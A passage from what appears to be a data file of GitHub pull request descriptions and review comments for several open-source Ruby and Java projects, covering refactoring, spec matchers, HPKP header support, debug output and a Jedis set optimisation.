During the implementation, I came across some design issues with the current code. I'd like to pick these up next (see FIXMEs and TODOs in this pull request).","[""@mvz before I review: You'd address the FIXMEs in a different PR, right?"", 'Yes, the FIXMEs and TODOs will be target for a separate PR.', "">> Yes, the FIXMEs and TODOs will be target for a separate PR.\r\n\r\nAlrightie!\r\n\r\nA lot to review - i'll probably won't be able to do so until next week i'm afraid.\r\n\r\n@gilles-leblanc @EmilRehnberg @bf4 could you jump in here?\r\n"", ""I'll rebase this. Hold on ..."", 'I think this PR would benefit from some squashing. :-)', '@oliverklee it will be squashed after the review is done. Squashing loses information that might be useful while the code may still be changed.', 'I\'ll review it tomorrow, it\'s already on my ""saturday"" todo list.:)', ""Looks excellent, please squash then I'll merge."", ""I've moved the FIXMEs, TODOs and whitespace changes out of the PR, and changed the option name to `--smell`, since `--only` doesn't cover the semantics, really."", 'Beautiful work there. Merged.']"
879,troessner/reek,129.0,https://github.com/troessner/reek/issues/117,"['The cucumbers are failing on Ruby 1.8: https://travis-ci.org/troessner/reek/jobs/4281948\r\n\r\nBy the way, @EmilRehnberg, would you like to be added to the list of people who get an email when the Travis CI builds fail?\r\n\r\n', ""Thank you! I'll look for a fix.\r\nYes, I'd like to be added to the Travis CI builds emails. How do I get myself added?"", 'I updated the commit and Travis CI seems to have made two builds after the commit. \r\nOne is passing (build 66 https://travis-ci.org/troessner/reek/builds/4293390) and one is failing (build 67 https://travis-ci.org/troessner/reek/builds/4293400). The failing seems unrelated to my update from what I can tell..\r\n\r\nIs this a problem? Do you have any wisdom to share?', '@EmilRehnberg I just added you to travis: https://github.com/troessner/reek/commit/baf028894cbe86866005905cd70e2f2b74679649\r\n\r\nSo now you know..:)', 'Haha, nice! Thank you @troessner :)', 'Looks like an excellent addition to reek!', ""Thank you, sir. I'll commit a fix for these, ASAP."", ""@EmilRehnberg I'll take a look at failed build 67. It seems to be an intermittent failure. I have a created a Travis VM on my laptop, so I can run a build several times and see if I can reproduce this."", '@mvz, that is incredibly kind of you, thanks! \r\nIf I don\'t run into problems with adding the cucumber test ""story"", I\'ll post a new commit in a few hours.', 'I updated the commit again.\r\n\r\nLooks like everything is passing over at travis: https://travis-ci.org/troessner/reek/builds/4304639\r\nSo @mvz, I hope I am not too late to save some of your valuable time in trying to reproduce that error. (Even though it might be valuable to know more about that 1.9.2 error.)\r\n\r\nPlease @troessner, could you be so kind and have a quick look at the diff and see if you like this one better?', 'Yes, looks good now.\r\n\r\n@mvz good point, we should probably get the connextra format right everywhere, but this is probably not too important now.', ""@troessner I'm not sure what you mean. The build failures seem due to reek sometimes not reporting any smells for one of the samples. Very odd.\r\n\r\n@EmilRehnberg No time wasted :-). I'll keep an eye on this intermittent build failure and maybe have another look this weekend."", ""@mvz i was just ranting about our story format, which could be a little bit more descriptive in my mind. But then again, that's really an absolute minor issue (if it is one at all), so never mind.""]"
880,troessner/reek,328.0,"### Status:

All tests are passing now.
@mvz review please.
In reference to : https://github.com/troessner/reek/issues/322

--------------

### Summary of all changes:

- I got rid of those awful SMELL_CLASS and SMELL_SUB_CLASS constants and introduced proper instance methods instead
- Introduced consistent naming. Now it's ""smell_class"" and ""smell_sub_class"" everywhere, not ""smellclass"", ""subclass"" and all other possible combinations
- Removed a couple of weird inconsistencies, for instance the DuplicateMethodSmell specifically checked for the number of calls to print out ""twice"" instead of ""2 times"". No other smell detector did this and the usefullness of this code in general was questionable, so I removed it.
- Removed SmellDescription again since now this is all handled in the SmellWarning or SmellDetector
- Made the yaml presentation of our smellwarnings leaner and better readable
- Reduced the initializer of SmellWarning to ```def initialize(smell_detector, options = {})``` and properly formatted all calls to it
- Dissolved unnecessary and confusing methods like: https://github.com/troessner/reek/pull/328/files#diff-3cebf3ed8bf2e7bb8722230d83a5261fL29
- Introduced factories. I believe we really need to rewrite and refactor big parts of our spec suite and this is first step in this direction and we can and should introduce those everywhere gradually to make our specs better readable.
- Removed a couple of specs that were just over-the-top: https://github.com/troessner/reek/pull/328/files#diff-3effa8810e8fa5e585292d52fd8ad2f1L121 
- Removed a couple of specs that shouldn't be there: https://github.com/troessner/reek/pull/328/files#diff-e1d2ab95ea1f1960578653dc80c68c32L79 - this detector is the only one checking for the yaml format which is not his responsibility.
- Made factory_girl, pry and byebug available in our specs by default

--------------

### Regarding the tests:

Unfortunately our spec suite is more often than not absolutely suffocating. Sometimes it costs significantly more time to deal with our incredibly tight to the implementation coupled spec suite than with actually writing code and I'm a little fed up with it. 
I actually didn't do a couple of other bigger refactorings in this pull request just because fixing the regarding specs would have been in incredible pain in the ass.

I believe our spec suite is so suffocating right now for the following reasons:

- Our specs are often mirroring the implementation. We have so many specs testing things like output that one change in the output requires you to change a dozen tests
- Our specs are often duplicates or at least overlapping with other specs.
- The level of detail for an output format is over-the-top for me. It's not like reek is a tool for emitting floor plans for nuclear facilities. Getting all those format specs right is a huge pain in the ass and I can't see a real reason for this (besides the ""oh my god, it's not spec'ed"" one)
- A lot of them are just in bad shape. There are so many specs that declare some instance variables at the top and use them 100 lines below in combination with other instance variables that come from 20 lines above.
- Not using factories properly or at all makes our specs incredibly hard to read because you have to cut through all that noise.

I am convinced that our spec suite right now is part of the problem, and not of the solution.

I'm going to refactor those specs step by step in follow-up PRs

--------------

### Things I left untouched

There were a couple of things I left untouched in this pull request because they would have required huge changes:

1.) Getting rid of the class methods ""smell_class"" and ""smell_sub_class"" for SmellDetector: https://github.com/troessner/reek/pull/328/files#diff-5b6de37fbe6e3791a90ceaf86e847935R58
2.) Getting rid of the gazillions of constants for the parameter keys that are floating around in almost every smell detector and that used and spread across our spec suite

I'll come up with separate PR's for those issues","['Whoopsie, forgot our travis set up, will fix that later (on the road right now).', '@mvz addressed all your comments except for https://github.com/troessner/reek/issues/344 to handle this separately. Ready for merge?']"
881,troessner/reek,350.0,"This PR gets rid of all parameter constants in our smell detectors, fixes #332 but leaves the parameters itself there since they are used in our spec matcher and our yaml output.

This PR also makes the ""parameters"" names consistent. For instance, take a look at ""UncommunicativeMethodName""  which contained:

>>  METHOD_NAME_KEY = 'method_name'

""method_name"" is in fact a knowledge duplication - ""name"" is speaking enough since it is absolutely clear given the context. Most of the parameter names duplicated knowledge regarding the SmellDetector somehow.

So I replaced most of them with consistent naming:

- 90% of all parameter are now just ""name"" and / or ""count""
- there are a couple of exceptions where it made sense to deviate from this schema, mostly ""DataClump"", ""FeatureEnvy"" and ""NestedIterators"".","['@mvz addressed all your comments.', '@mvz any objections to merge this bad boy?', 'Nope .. merging.']"
882,troessner/reek,356.0,"This addresses #351 

With this pull request there are 3 ways of passing `reek` a configuration file:

1. Using the cli ""-c"" switch
2. Having a file ending with .reek either in your current working directory or in a parent directory (more on that later)
3. Having a file ending with .reek in your HOME directory

The order in which `reek` tries to find such a configuration file is exactly like above: First `reek` checks if we have given it a configuration file explicitly via CLI. Then it checks the current working directory for a file and if it can't find one, it traverses up the directories until it hits the root directory. And lastly, it checks your HOME directory.

As soon as `reek` detects a configuration file it stops searching immediately, meaning that from `reek`'s point of view there exists one configuration file and one configuration only regardless of how many "".reek"" files you might have on your filesystem.

A word regarding the features:

When fixing the failing features I improved them while I was at it. For instance a lot of the features were targeting ""masked"" samples even though the ""masking"" was totally irrelevant for the feature itself and thus highly misleading.",['@mvz addressed all your comments.']
883,troessner/reek,371.0,,"['Ready for review @mvz ! Following the boyscout rule I also fixed the formatting of the spec files I touched in the course of this PR.', ""This is the last thing that's keeping us from releasing reek-2  - anybody up for reviewing this bad boy?.:)"", ""I'll take a look this weekend."", 'I had thought that we had discussed this enough in issue #319  but now I realize that we probably haven\'t.\r\n\r\nSo let\'s get this sorted out!\r\n\r\nI\'d say we go for:\r\n\r\n```Ruby\r\nreek_of(DuplicateMethodCall, name: \'thingie\', count: 4)\r\n```\r\n\r\nWith the second argument being one hash that is optional. \r\n\r\nBut if this hash is given, it \r\n\r\n1.) must match exactly so if ""count"" is 5 this match would fail.\r\n2.) if this hash contains non-sensical keys like ""mame"" (mind the typo) we raise ArgumentError to make it clear to the user (which would be mostly us)\r\n\r\nThe same would apply for reek_only_of.\r\n\r\nWDYT?', ""@troessner this seems the way to go. Some edge cases:\r\n\r\n* `reek_of` doesn't mind if there are other smells of a different category. `reek_only_of` will fail in that case.\r\n* If there are two smells of the given category, `reek_of` with hash is happy if one of them matches the hash.\r\n* If there are two smells of the given category, `reek_only_of` with hash will fail; `reek_only_of` without hash will not fail.\r\n* `should_not reek_only_of` should fail if there are no smells that match the given category and hash, e.g.,  if there are no smells at all, or if there are only smells of other categories."", '>> reek_of doesn\'t mind if there are other smells of a different category. reek_only_of will fail in that case.\r\n\r\nAck.\r\n\r\n>> If there are two smells of the given category, reek_of with hash is happy if one of them matches the hash.\r\n\r\nAck.\r\n\r\n>> If there are two smells of the given category, reek_only_of with hash will fail; reek_only_of without hash will not fail.\r\n\r\nI don\'t get it, why?\r\n\r\nConsider this code:\r\n\r\n```Ruby\r\nsrc = <<-EOS\r\n  def(x, y)\r\n    puts ""hossa""\r\n  end\r\nEOS\r\n```\r\n\r\n`reek` will report 2  UnusedParameters warnings.\r\n\r\nSo \r\n\r\n```Ruby\r\nreek_only_of(UnusedParameters, name: \'x\')\r\n```\r\n\r\nwould fail but\r\n\r\n```Ruby\r\nreek_only_of(UnusedParameters)\r\n```\r\n\r\nwouldn\'t? What\'s the rationale behind this?\r\nIn my mind, this is not intuitive and too complicated.\r\nHow about having both examples succeed?\r\n\r\n>>should_not reek_only_of should fail if there are no smells that match the given category and hash, e.g., if there are no smells at all, or if there are only smells of other categories.\r\n\r\nThis sounds to complicated to me. But let\'s rather discuss this after the points above.\r\n\r\n', 'P.S.: I revamped the docs for reek_of significantly to make sure that we are on the same  page.', 'P.P.S:\r\n\r\nI vote for keeping things simple:\r\n\r\n[1] ""reek_only_of"" succeeds if source reeks only of one and the same category / type.\r\n[2]  This category / type can occur multiple times\r\n[3] If we pass a hash [1] and [2] still apply. Only this time we\'re looking for a smell that matches the smell_detail.\r\n\r\nTo me this seems to be the most intuitive and simple solution and the way to go.\r\n\r\nWhat do you think?', ""Does your step [3] mean, that all found smells must match both the category and the hash? That would be most intuitive to me.\r\n\r\nAs an aside, perhaps `reek_only_of` with a hash is too complicated, because it is unclear what should be meant. We only use it in a couple of places, and I think those would work just fine with `reek_only_of` with just the smell category (and even where we use it, the 'only' part is sometimes not relevant, or the spec's clarity would probably be improved by splitting it into `not reek_of(X)` plus `reek_of(Y)`, because other smells are not relevant)."", '>> Does your step [3] mean, that all found smells must match both the category and the hash? That would be most intuitive to me.\r\n\r\nNo, just one would have to match.:)\r\n\r\n>> As an aside, perhaps reek_only_of with a hash is too complicated, because it is unclear what should be meant.\r\n\r\nSounds reasonable. Let\'s drop the smell_details for ""reek_only_of"".', '@mvz I believe I implemented everything we talked about. Final review please.:)', '@mvz incorporated all your feedback - merge?..:)', 'Awesome! Merging....', 'P.S.: I also updated our wiki: https://github.com/troessner/reek/wiki/RSpec-matchers\r\nI think this information should be exhaustive to get everybody started.']"
884,troessner/reek,456.0,"This cleans up the README:

* moves things relevant to the contributing guide to CONTRIBUTING.md and links it,
* spells reek uniformly everywhere,
* drops the teletype `reek` stylisation (Im open to reverting this one if youre fond of it),
* switches to a flat gem version badge,
* uses less eye-bleeding `Hash` syntax in `demo.rb`,
* changes RubyDoc.info link to the current canonical form and links to the gems docs, which seem to be fresher (regenerated on gem pushes, probably),
* fixes typography, capitalisation and hyphenation,
* adjusts some wording to read better.","[""I'm not sure about moving stuff to CONTRIBUTING.md. I'd like to  keep that file short and sweet because GitHub links to it from the issue creation page. We don't want people to TL;DR it or think contributing to Reek is too hard."", '>> I\'m not sure about moving stuff to CONTRIBUTING.md. I\'d like to keep that file short and sweet because GitHub links to it from the issue creation page. We don\'t want people to TL;DR it or think contributing to Reek is too hard.\r\n\r\n:+1: \r\n\r\n>> drops the teletype reek stylisation (I\xe2\x80\x99m open to reverting this one if you\xe2\x80\x99re fond of it),\r\n\r\nI vote for reverting this. ""reek"" is a name in this case, but it\'s also a proper english verb, so we should style it properly. Otherwise it gets confusing and sentences get weird...\r\n', '> > drops the teletype reek stylisation (I\xe2\x80\x99m open to reverting this one if you\xe2\x80\x99re fond of it),\r\n\r\n> I vote for reverting this. ""reek"" is a name in this case, but it\'s also a proper english verb, so we should style it properly. Otherwise it gets confusing and sentences get weird...\r\n\r\nI agree. We should set it apart as a name either as `reek` or as Reek.', 'Updated as per comments:\r\n* removed additions to `CONTRIBUTING.md`,\r\n* reverted the _Developing `reek` / Contributing_ section,\r\n  * I still feel that the `bundle exec rspec spec/your/file_spec.rb:23`, etc. examples make more sense in the contributing guide (or should be removed altogether, as they seem strangely specific for README),\r\n* wrapped the longest paragraphs,\r\n* stylised `reek` everywhere (FWIW: I\xe2\x80\x99m also ok with spelling it with a capital \xe2\x80\x98R\xe2\x80\x99),\r\n* switched all curly apostrophes to straight ones,\r\n  * should we also add double spaces after periods and spell Timo\xe2\x80\x99s name as \xe2\x80\x98Roessner\xe2\x80\x99? ;)\r\n* removed dashes,\r\n* addressed the other minor fixes.', 'Wait, whats wrong with my name?..:)\r\nI mean, i know, the Umlauts and the sharp s, but is this causing problems somewhere?', 'Nothing\xe2\x80\x99s wrong with your name, and there are no problems (that was my point)! I was just making a tongue-in-cheek, slippery-slope argument against straight apostrophes \xe2\x80\x93 they\xe2\x80\x99re not harder to type than your name (especially once you configure your keyboard properly). ;)\r\n\r\nSeriously though: I _do_ understand the argument of \xe2\x80\x98I type apostrophes/quotes/dashes/ellipses often and I don\xe2\x80\x99t want to change my habits just to have proper typography\xe2\x80\x99, so I reverted to straight apostrophes. Maybe 2016 will be the year of proper typography on the destop. ;)', '> I type apostrophes/quotes/dashes/ellipses often and I don\xe2\x80\x99t want to change my habits just to have proper typography\r\n\r\nHa! No, my argument was that a single right quote is not an apostrophe. Mind you, I could still be wrong :smile:.', '> a single right quote is not an apostrophe\r\n\r\nOh but [it is](http://en.wikipedia.org/wiki/Apostrophe#Unicode). :smile:', 'Nice clean up, merged!', '> Oh but it is. :smile:\r\n\r\nI said I could be wrong :smile:. Feel free to move back to proper apostrophes.']"
885,troessner/reek,511.0,,"['Good changes in general. See my two comments.', '@mvz addressed all comments!']"
886,twitter/commons,164.0,"Instead of the single select list at the top I added select lists for every single logger. I also removed the button and now the user just has to select their option in the select list and the information is posted. 

![screenshot](https://f.cloud.github.com/assets/1043168/889389/c5644d50-fa1d-11e2-8206-79666138ca77.JPG)

![showing select list](https://f.cloud.github.com/assets/1043168/889390/c6cba080-fa1d-11e2-916d-04e32f007752.JPG)
","['I gave this a shot locally, works as expected.  Nice job!', 'Thanks a bunch.']"
887,twitter/elephant-bird,439.0,"This resurrects @ianoc's branch that adds generic block record reader, which uses the provided `BinaryConverter` to deserialize data.

Also moved some common code to a new `LzoBlockRecordReader` class.

Will create scalding PR to add `LzoGenericScheme` once this is merged.","['Based on offline conversation with @rangadi and @ianoc, dropping the new generic class in favor of moving this logic to the existing `LzoBinaryBlockRecordReader`. This class now 1) skips null records, 2) deserializes the read ByteString instead of deferring to the underlying `BinaryBlockReader`.', 'Thanks Ruban, the patch is much smaller now.\r\n\r\nYou need to update ThriftConverter and ProtobufConverter for new contract: null implies skip, any decoding errors should result in a exception.\r\n\r\nYou also need to update B64 reader to comply to new contract.', '@rangadi Thanks for the review. Addressed most of your comments.', 'mostly looks good. added a few more comments. please look into the travis ci failures.', 'Addressed further comments and some build fixes.', '+1. LGTM. Thanks Ruban.', 'Before we merge have you run a sanity job with some data at scale just to make sure it works on hadoop cluster?', ""@laurentgo addressed most of your comments, thanks.\r\n\r\n@ianoc ran a day's worth of client event logs and a couple of other sources including protobuf ones as a sanity check."", '@rubanm lgtm']"
888,twitter/elephant-bird,440.0,Adds LzoGenericBlockOutputFormat for use with the new LzoGenericScheme/Source to be added to Scalding.,[]
889,twitter/hbc,39.0,,"[""Updated.\r\nYeah i tried to mock it, but it got REALLY gnarly really fast, and still didn't work. This was the easier alternative i think.""]"
890,twitter/hraven,18.0, Enabling parsing of 2.0 job history files without referring to 2.0 packages/jars,"['I have not yet added a mapping between old keys and new keys between 1 .0 and 2.0. For instance,  in 1.0 there was a ""TOTAL_MAPS"" and in 2.0, it now is ""totalMaps"".  Will add it if needed after discussion.', 'Two minor comments to resolve: mixed static and instance context, and a wording fix in an exception message.  Otherwise this looks good to merge to me.', 'Thanks Gary! I will fix these and update the request today.']"
891,twitter/hraven,16.0,(also deleting the job conf file test which was not doing anything),"['Updated the files with the review recommendations', ':+1: ', 'Updated as per review comments for exceptions, documentation and formatting']"
892,twitter/secureheaders,132.0,I've added support for HPKP headers now that it is supported in both Chrome and Firefox.,"[""Damn you 1.8.7. I'm ready to drop support and the timing is right given the pending 2.0 release."", ""I'd love an additional sanity check from someone with experience working with the header. @ptoomey3  ? Did the pin-* value need to be quoted or something?"", 'If you merge master, the build will pass on 1.8.7', ""I just gave that a quick glance, but left some initial feedback. More generally, I would be hesitant to set this for Chrome, as the current stable implementation has a number of bugs:\r\n\r\nhttps://code.google.com/p/chromium/issues/detail?id=444511\r\nhttps://code.google.com/p/chromium/issues/detail?id=412866\r\n.. I'd have to double check if there are any additional known issues\r\n\r\nThe above bugs prevent `max-age` from working, doesn't let you revoke/rotate out a known pin, and always sets the `includeSubdomains` directive even when the policy does NOT have it set. So, I'd be a bit cautious with putting `Public-Key-Pins` in a release until things settle down. Supposedly these will be fixed in the next Canary release, but I haven't had a chance to validate the fixes yet. Also, I haven't played around with Firefox 35 as much, but I haven't yet seen anything unexpected or that violates the spec in my limited testing."", '@ptoomey3 what say you, is hpkp ready for inclusion? Any browser quirks worth working around?', ""I haven't actually tested it in Chrome V42 stable, but when I tested Chrome V42 beta the HPKP bug was fixed. So, in all likelihood, yeah, this should be stable enough in Chrome/Firefox to be useful."", ""> Any browser quirks worth working around?\r\n\r\nI don't believe so. ""]"
893,twitter/twitter-cldr-rb,44.0,This PR isn't quite ready to merge yet as it appears a few of the new languages (plus a few old ones) throw errors for certain date formats.  Fixes for this gem and a few for [ruby-cldr](http://github.com/svenfuchs/ruby-cldr) coming soon!,"['Hey @KL-7, what do you think?', ""Ok, I'm going to merge this in and release v1.5.0 even though tailoring isn't finished yet.  We need to release a new version to fix some jank on twitter.com."", 'This pull request [passes](http://travis-ci.org/twitter/twitter-cldr-rb/builds/1732715) (merged 27d90c01 into 8b4fff81).', ""By the way @camertron, while you were gone on vacation, I got travis ci support on pull requests. It's fancy now.""]"
894,twitter/twitter-cldr-rb,92.0,"Whereas before you had to rely on a third-party library like `I18n` or `FastGettext`, to set the global locale for TwitterCLDR, the global locale setter allows users to easily set `TwitterCldr.locale` instead:

```ruby
# January 7, 2013 at 4:57:04 p.m. -08:00
DateTime.now.localize.to_long_s

TwitterCldr.locale = :es

# 7 de enero de 2013 16:53:55 -08:00
DateTime.now.localize.to_long_s
```

You can use the `TwitterCldr.with_locale` method to change the locale only within the scope of a block:

```ruby
# January 7, 2013 at 4:57:04 p.m. -08:00
DateTime.now.localize.to_long_s

TwitterCldr.with_locale(:es) do
  # 7 de enero de 2013 16:53:55 -08:00
  DateTime.now.localize.to_long_s
end

# January 7, 2013 at 4:57:04 p.m. -08:00
DateTime.now.localize.to_long_s
```

Finally, you can now add customized locale fallbacks to control which locale is used.  The most recently added fallback is applied first:

```ruby
TwitterCldr.register_locale_fallback(
  lambda { nil }  # fallback always fails / returns nil
)

TwitterCldr.locale  # :en

TwitterCldr.register_locale_fallback(
  lambda { if 1 + 1 == 2 then :ru else :pt end }
)

TwitterCldr.locale  # :ru
```","[""Nice work! This will close #70. \r\n\r\nBtw, maybe you could rebase this branch on `master` \xe2\x80\x93 it'll reduce the number of commits in the PR by half :)"", 'Great suggestions as always, @KL-7!  Thanks for reviewing :)', 'Huh, I got an email about this comment, but can\'t see it here after the rebase:\r\n\r\n> Fallbacks are meant to either return a locale symbol, nil, or fail silently. If they raise or return nil, the system ""falls back"" on the next fallback or the default locale if no other fallbacks exist.\r\n\r\nI can see why it makes sense to suppress any exceptions inside the fallbacks in most cases, but on the other hand silently ignoring these exceptions can make it pretty difficult to track down an error inside a user-defined fallback, because user won\'t have any stack trace or any other sign of an exception that was raised inside the fallback. Anyway, it\'s up to you, just sharing an idea.', 'Thanks again :)  Looks like the comment you couldn\'t see is being hidden by a new github feature.  Scroll up a bit and look for ""KL-7 discussed an outdated diff 11 hours ago"".  There should be a link there that will show you the comment history.']"
895,typhoeus/ethon,64.0,"Previous discussions in https://github.com/typhoeus/ethon/issues/63 and https://github.com/typhoeus/typhoeus/issues/247.

Uses the CURLOPT_DEBUGFUNCTION callback to save all debug info:
http://curl.haxx.se/libcurl/c/curl_easy_setopt.html#CURLOPTDEBUGFUNCTION

Allows you to do this:
```ruby
easy = Ethon::Easy.new url: ""example.com"",
                       verbose: true,
                       followlocation: true,
                       headers: { ""X-Test"" => ""hi"" }
easy.perform
puts easy.request_headers
```

Output:
```
GET / HTTP/1.1
Host: example.com
Accept: */*
X-Test: hi

GET / HTTP/1.0
Host: example.iana.org
Accept: */*
X-Test: hi
```","[""Hey,\r\n\r\nThose aren't really request *headers*, that's the whole ASCII request data so calling it something like `raw_request` would be better suited I think."", ""You're right, but what's currently named ```response_headers``` is also technically the full response and not just the headers. It'd probably be better to rename both and use separate hashes for the actual headers, but this naming is at least consistent for now."", ""Ah ok didn't know that, fair enough then."", 'What do you think about saving all informations and not only the headers?! \r\nBut also the type so it can be through methods? Maybe something like that:\r\n\r\n```ruby\r\n\r\nclass DebugInformations\r\n  class Message\r\n    attr_reader :type, :message\r\n\r\n    def initialize(type, message)\r\n      @type = type\r\n      @message = message\r\n    end\r\n  end\r\n\r\n  def initialize\r\n    @messages = []\r\n  end\r\n\r\n  def add(type, message)\r\n    @messages << Message.new(type, message)\r\n  end\r\n\r\n  def text\r\n    messages_for(:text)\r\n  end\r\n\r\n  def header_in\r\n    messages_for(:header_in)\r\n  end\r\n\r\n  def header_out\r\n    messages_for(:header_out)\r\n  end\r\n\r\n  def data_in\r\n    messages_for(:data_in)\r\n  end\r\n\r\n  def data_out\r\n    messages_for(:data_out)\r\n  end\r\n\r\n  def messages_for(type)\r\n    @messages.select{|m| m.type == type}.map(&:message)\r\n  end\r\n\r\n  def to_h\r\n    {\r\n      all: @messages.map(&:message),\r\n      text: text,\r\n      header_in: header_in,\r\n      header_out: header_out,\r\n      data_in: data_in,\r\n      data_out: data_out,\r\n    }\r\n  end\r\nend\r\n```', ""Yes, I think that's a great idea! We might as well save all the debug information if we're going to be using debugfunction. Sounds like the next step from here."", 'Btw, I was having an issue with the specs sometimes segfaulting in Ruby 2.0.0-p247, but it looks like upgrading curl fixed it. It was crashing on 7.24.0 but works fine with 7.31.0. The CRuby segfaults on the Travis CI builds are probably also related to old curl versions.', 'With these changes, when running the specs, there are no segfaults in easy_cleanup as of curl version ```>= 7.29.0```, but ```= 7.29.0``` segfaults in multi_cleanup, as referenced in another issue.', ""I wanted to get the specs passing regardless of the curl version, so I'm no longer setting verbose = true. You'll have to explicitly set it in order to access the debug information and raw request data, but I think this is a reasonable default."", 'Thank you very much!']"
896,vcr/vcr,483.0,"Implements a compressed cassette format.

I had trouble getting the features to run locally with `script/test features/cassettes/format.feature`. There's a ton of errors like:

```
features/cassettes/format.feature:79:in `When I successfully run `ruby cassette_yaml.rb 'Hello'`'

Exit status was 1 but expected it to be 0. Output:

/opt/rubies/2.1.4-github1/lib/ruby/2.1.0/rubygems/version.rb:192:in `new': uninitialized constant Gem::VERSION (NameError)
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/safe_yaml-1.0.4/lib/safe_yaml/libyaml_checker.rb:8:in `<class:LibyamlChecker>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/safe_yaml-1.0.4/lib/safe_yaml/libyaml_checker.rb:4:in `<module:SafeYAML>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/safe_yaml-1.0.4/lib/safe_yaml/libyaml_checker.rb:3:in `<top (required)>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/safe_yaml-1.0.4/lib/safe_yaml/load.rb:10:in `require'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/safe_yaml-1.0.4/lib/safe_yaml/load.rb:10:in `<top (required)>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/crack-0.4.2/lib/crack/json.rb:6:in `require'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/crack-0.4.2/lib/crack/json.rb:6:in `<top (required)>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/crack-0.4.2/lib/crack.rb:6:in `require'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/crack-0.4.2/lib/crack.rb:6:in `<top (required)>'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/webmock-1.21.0/lib/webmock.rb:5:in `require'
	from /opt/rubies/2.1.4-github1/lib/ruby/gems/2.1.0/gems/webmock-1.21.0/lib/webmock.rb:5:in `<top (required)>'
	from /Users/ben/repos/vcr/lib/vcr/library_hooks/webmock.rb:3:in `require'
	from /Users/ben/repos/vcr/lib/vcr/library_hooks/webmock.rb:3:in `<top (required)>'
	from /Users/ben/repos/vcr/lib/vcr/configuration.rb:503:in `require'
	from /Users/ben/repos/vcr/lib/vcr/configuration.rb:503:in `load_library_hook'
	from /Users/ben/repos/vcr/lib/vcr/configuration.rb:68:in `block in hook_into'
	from /Users/ben/repos/vcr/lib/vcr/configuration.rb:68:in `each'
	from /Users/ben/repos/vcr/lib/vcr/configuration.rb:68:in `hook_into'
	from cassette_yaml.rb:12:in `block in <main>'
	from /Users/ben/repos/vcr/lib/vcr.rb:199:in `configure'
	from cassette_yaml.rb:11:in `<main>'

 (RSpec::Expectations::ExpectationNotMetError)
```

Do the features needs to be run with a particular ruby version or something?","[""Christ, Hound is painfully verbose. \r\n\r\nI'll see about looking this over today, maybe merging by lunch."", 'Alright, rebase from master and you should be able to run that test.', 'Okay, added a feature.', 'Muchos gracias.', ':metal:\r\n\r\nI have this worked into the use case I had, so no rush, but could you cc me the next time you bump the gem? :heart:']"
897,venmo/slather,34.0,Fixes issue #33.,"['Thanks for this @tarbrain!', 'Ok,  I think this is it.\r\nI have made some improvements and everything runs way more robust.\r\nAnd looks much nicer too :-D\r\n\r\nCheers\r\ntarbrain', 'Thanks!', ""Would be nice to have a new release of the gem with this fix included :)  I've spend a few hours poking around today why it doesn't run to me before I've tried HEAD version of slather and it works! :)\r\n\r\nThanks for fixing this!"", ""Sorry! I've been meaning to cut a new release, but I left my laptop at the\r\noffice this weekend\r\n\r\nOn Sunday, November 2, 2014, Victor Ilyukevich <notifications@github.com>\r\nwrote:\r\n\r\n> Would be nice to have a new release of the gem with this fix included :)\r\n> I've spend a few hours poking around today why it doesn't run to me before\r\n> I've tried HEAD version of slather and it works! :)\r\n>\r\n> Thanks for fixing this!\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/venmo/slather/pull/34#issuecomment-61423877>.\r\n>"", '@marklarr no worries! :) ', '`1.5.1` is out!']"
898,xetorthio/jedis,977.0,"Hi, I face a similar issue with https://github.com/xetorthio/jedis/issues/907.
This PR is my solution to eliminate overhead of Set creation from List.

The core idea is introducing SetFromList class. For this we can
* Eliminate Set creation overhead including both memory and time
* Fast set iteration by backed ArrayList

Here is result. 
You can see test code [HERE](https://gist.github.com/itugs/2fb948f0a340e8ff9a29) 
```
LinkedHashSet creation Timing avg : 86.44 ms
SetFromList creation Timing avg : 0.0 ms

LinkedHashSet iteration Timing avg : 8.0 ms
SetFromList iteration Timing avg : 2.55 ms
```","[""I've commented some notes, but LGTM overall.\r\nThanks for your effort!\r\n\r\nBtw, it's trade off between speed of creation / iteration and speed of membership check / deletion.\r\nIf we really need to provide O(1) on contains() we should stick HashSet. \r\nBut our method signature don't promise it, and IMO users may use return value to iterate more than checking membership, so it would be fine to change it.\r\n\r\n@xetorthio @marcosnils \r\nI'd like to hear your opinion. Thanks!"", ""Please note that it doesn't check duplication on constructor. It heavily relies on Redis response, so we should use this to only proper places. (In other word, use with caution! ;) )"", ""@HeartSaVioR\r\nThank you for you review.\r\n\r\nFor that trade off(creation/iteration vs. membership/deletion) you mentioned, that's my assumtions.\r\nI write it down here.\r\n\r\n1. Iteration of Set is dominant than membership check. eg) deserialize byte[] to specific type\r\n2. Deletion is rare\r\n3. If membership check is big problem, then user can create HashSet again. Although it looks little complicate, but overall cost is same as before."", 'Yes. Important thing is ""We don\'t promise that it returns HashSet."". So focusing Set\'s basic features is enough.\r\n\r\nBtw, maybe it would be better to change its name to more descriptive way, like SetFromNonDuplicateList or SetFromUniqueElementsList, or more proper name.\r\nMy last concern is improper usage of SetFromList. It never checks origin list, so we should explain its limitation, and maybe comment couldn\'t be enough.', ""@HeartSaVioR As naming we can change the class name but as you said someone can still use it improper way. So I think naming is not a big deal but I wanna listen other collaboratos' opinions.\r\n"", '@itugs @HeartSaVioR PR LGTM!. \r\n\r\n@HeartSaVioR please give a last review and feel free to merge!.', ""@marcosnils How about its name? I commented below earlier, and want to know your opinion. Thanks!\r\n\r\n> Btw, maybe it would be better to change its name to more descriptive way, like SetFromNonDuplicateList or SetFromUniqueElementsList, or more proper name.\r\nMy last concern is improper usage of SetFromList. It never checks origin list, so we should explain its limitation, and maybe comment couldn't be enough."", ""@HeartSaVioR IMHO the class name it's fine. Maybe we can clarify it's limitations through javadoc and make it an InnerClass from BinaryJedis so nobody can use it incorrectly outside Jedis. As long as we control merges then we shouldn't encounter any proble,s \r\n\r\nIf we 